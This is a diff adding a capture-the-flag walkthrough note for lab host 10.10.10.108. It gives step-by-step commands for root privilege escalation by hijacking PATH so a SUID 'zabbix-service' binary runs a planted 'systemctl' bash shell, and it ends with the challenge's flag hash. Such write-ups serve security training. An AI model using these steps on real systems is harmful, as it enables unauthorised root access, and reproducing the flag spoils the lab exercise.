@@ -1,0 +1,53 @@
+#10.10.10.108
+--------------
+#connect through ssh OR just move forward from Low Privilege shell
+ssh -i ssh_key(zapper) zapper@10.10.10.108
+-----------------------------------------------------------------------------------------------------
+#check for SUID files
+find / -perm /4000 2>/dev/null
+#'zabbix-service' file has SUID
+
+#Privilege escalation using path variable (check link for more help)
+>>>https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
+
+#'zabbix-service' has SUID i.e. there is a function system() inside this file and that is using a cmd as root
+#check inside 'zabbix-service' what is the cmd system() is executing 
+strings zabbix-service
+	OR
+ltrace ./zabbix-service
+#found:  systemctl daemon-reload && systemctl start zabbix-agent
+      :  systemctl stop zabbix-agent
+#it'll look like this: system(systemctl ......) 
+#so 'systemctl' cmd is running as root inside 'zabbix-service' file
+
+----------------------------------------------------------------------------------------------------
+#now create another cmd name as 'systemctl' and push a bash inside that
+#create a small c program to call a function of system binaries :- "systemctl.c"
+#check out "systemctl.c" file
+#upload this on server in /tmp folder
+#compile code
+gcc -o /tmp/systemctl /tmp/systemctl.c
+chmod 777 /tmp/systemctl
+	OR
+#directly create 'systemctl' file
+vi /tmp/systemctl
+#add this into systemctl file
+```
+#!/bin/bash
+bash
+```
+chmod +x /tmp/systemctl
+
+
+#now change the path variable			
+echo $PATH             
+export PATH=/tmp:$PATH         #adding /tmp to starting of PATH variable so that our 'systemctl' cmd(that we created) gets execute first
+echo $PATH
+cd /home/zapper/utils/
+./zabbix-service
+start
+
+
+#key
+a7c743d35b8efbedfd9336492a8eab6e
+
